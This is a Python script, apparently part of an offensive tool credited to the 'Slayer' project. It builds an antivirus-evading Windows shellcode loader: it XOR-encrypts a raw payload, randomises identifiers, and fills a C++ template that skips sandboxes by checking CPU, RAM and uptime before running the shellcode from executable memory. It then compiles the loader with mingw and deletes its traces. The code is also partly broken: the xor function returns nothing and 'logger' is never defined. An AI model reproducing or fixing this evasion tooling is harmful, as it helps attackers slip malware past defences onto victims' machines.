# script from https://github.com/mertdas/Slayer
# thanks for awesome AV Slayer!

import os
import random
import string
import sys
import time
import tornado.core.logger
from tornado.core.logger import info, infot, warn, warnt, goodt, good, error, errort

def get_random_string():
    length = random.randint(5, 35)
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    return result_str

def xor(data, key):
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        o = lambda x: x if isinstance(x, int) else ord(x)
        output_str += chr(o(current) ^ ord(current_key))

    ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
    return

def create_template():
    template = open("template.cpp", "w+")
    template.write(
    r'''#include <windows.h>
#include <stdio.h>
#include <iostream>
#define MULTI_LINE_STRING(a) #a
#pragma comment(linker, "/INCREMENTAL:YES")
#pragma comment(lib, "user32.lib")
#define WIN32_LEAN_AND_MEAN
BOOL aynenKardesim() {
  SYSTEM_INFO inf;
  MEMORYSTATUSEX memStat;
  DWORD proc;
  DWORD belleq;
  GetSystemInfo(&inf);
  proc = inf.dwNumberOfProcessors;
  if (proc < 2) return false;
  memStat.dwLength = sizeof(memStat);
  GlobalMemoryStatusEx(&memStat);
  belleq = memStat.ullTotalPhys / 1024 / 1024 / 1024;
  if (belleq < 2) return false;
  return true;
}
int main(int argc, char** argv)
{
	
	if (aynenKardesim() == false) {
    return -2;
    }
    else{
  
	ULONGLONG uptime = GetTickCount() / 1000;
	if (uptime < 1200) return false;
		
        unsigned char buf[] = " ";
        char key[] = " ";
        char shellcode[sizeof buf];
        int j = 0;
        for (int i = 0; i < sizeof buf; i++)
        {
            if(j == sizeof key -1 ) j = 0;
            shellcode[i] = buf[i] ^ key[j];
            j++;
        }
        
        void* kardeslerpentest = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(kardeslerpentest, shellcode, sizeof shellcode);
        ((void(*)())kardeslerpentest)();
        return 0;
       }
}
''')
    template.close()

def slayer():
    xorkey = get_random_string()
    buf = get_random_string()
    shellcode = get_random_string()
    monitorinfo = get_random_string()
    systemInfo = get_random_string()
    logger.infot('Generating code for fully undetectable..')
    create_template()
    time.sleep(1)
    try:
        plaintext = open("tornado.raw", "rb").read()
    except:
        logger.errort('Failed to read tornado.raw.')
        logger.errort('Missing tornado.raw in pwd?')
        sys.exit(1)
    ciphertext = xor(plaintext, xorkey)
    template = open("template.cpp", "rt")
    data = template.read()
    time.sleep(1)
    data = data.replace('unsigned char buf[] = " ";', "unsigned char buf[] = " + ciphertext + " ")
    data = data.replace('char key[] = " "','char key[] = "' + xorkey + '"')
    data = data.replace("buf", buf)
    data = data.replace("key", xorkey)
    data = data.replace("shellcode", shellcode)
    data = data.replace("monitorInfo", monitorinfo)
    data = data.replace("systemInfo", systemInfo)
    template.close()
    template = open("tornado.cpp", "w+")
    template.write(data)
    time.sleep(1)
    template.close()

def compile():
    application_name = get_random_string()
    os.system(f"x86_64-w64-mingw32-g++ -o {application_name}.exe tornado.cpp -static-libstdc++ -static-libgcc")
    time.sleep(1)
    logger.infot('Temp files are cleaning..')
    try:
        os.system("rm -rf tornado.cpp template.cpp tornado.raw")
        logger.goodt('Temp files are cleaned.')
    except:
        logger.errort('Temp files are not cleaned.')
    logger.goodt(f'Fully undetectable {application_name}.exe generated :)')
    print(logger.banner)
